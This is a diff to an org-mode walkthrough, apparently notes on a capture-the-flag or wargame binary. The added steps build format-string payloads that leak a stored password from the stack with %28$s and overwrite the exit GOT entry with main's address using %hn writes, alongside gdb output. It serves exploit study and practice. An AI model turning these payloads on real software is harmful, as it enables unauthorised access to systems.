@@ -1,5 +1,5 @@
-#+title: walkthrough
 * Data Gathering
+#+title: walkthrough
 ** Binary Sec
 #+begin_src shell
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
@@ -528,17 +528,15 @@ https://man7.org/linux/man-pages/man3/printf.3.html
       BBBBBBBB0x7fffffffea20(nil)0x610x2a2a2a2a2a2a2a2a0x2a2a2a2a2a2a2a2a0x7fffffffec180x1f7ff9a080x61(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)0x100000000(nil)0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d(nil)0x4242424242424242#Here is the buffer.
   BBBBBBBB%28$p%29$p%30$p Format string.
 BBBBBBBB0x42424242424242420x39322570243832250x70243033257024 does not have access!
-
-
-
-
-
 #+end_src
 offset = 28
+
+**** CANC print the string.
+CLOSED: [2025-11-28 Fri 06:48]
 #+begin_src shell
     username_va=0x00007fffffffe9f0
     change AAAAAAAA with the username va and change %28$p -P %28$s.
-    (python -c 'print "\x00\x00\x7f\xff\xff\xff\xe9\xf0"[::-1]+"%28$s"') | ./$USER
+    (python -c 'print "\x00\x00\x7f\xff\xff\xff\xe9\xf0"[::-1]+"%28$s"'| cat -) | ./$USER
     ===== [ Secure Access System v1.0 ] =====
     /***************************************\
     | You must login to access this system. |
@@ -546,6 +544,39 @@ offset = 28
     --[ Username: --[ Password: *****************************************
     πιÿÿÿ does not have access!
     Is failing because the ptr of the stack is wrong.
+#+end_src
+***** Fix the stack ptr.
+#+begin_src shell
+  unset env LINES
+  unset env COLUMNS
+  b main
+  r
+  p/x $rbp-0xA0
+  passwd_va = 0x7fffffffea80
+  (python -c 'print "\x00\x00\x7f\xff\xff\xff\xea\x80"[::-1]+"%28$s"'; cat - ) | $PWD/$USER
+
+#+end_src
+*** Use exit got
+#+begin_src shell
+    (gdb) x/i exit
+    0x400710 <exit@plt>:	jmpq   *0x200b12(%rip)        # 0x601228 <exit@got.plt>
+    (gdb) x/lga  0x601228
+    0x601228 <exit@got.plt>:	0x400716 <exit@plt+6>
+    exit_got_plt_va = 0x601228 <exit@got.plt>
+    main_va =  0x0000000000400a85
+
+    p/x (int)0x0000000000400a85
+    $1 = 0x400a85
+    p/d (int)0x0000000000400a85
+    4196997
+  p/x (short[2])0x0000000000400a85
+  $5 = {0xa85, 0x40}
+  p/d (short[2])0x0000000000400a85
+  $6 = {2693, 64}
+   #64 - 14 = 50
+   #2693 - 64 = 2629
+
+    (python -c 'print "\x00\x00\x00\x00\x00\x60\x12\x28"[::-1]+ "\x00\x00\x00\x00\x00\x60\x12\x32"[::-1]+"%50d%28$hn%2629d%29$hn"'; cat - ) | $PWD/$USER
 #+end_src
 * Exploit
 #+begin_src shell
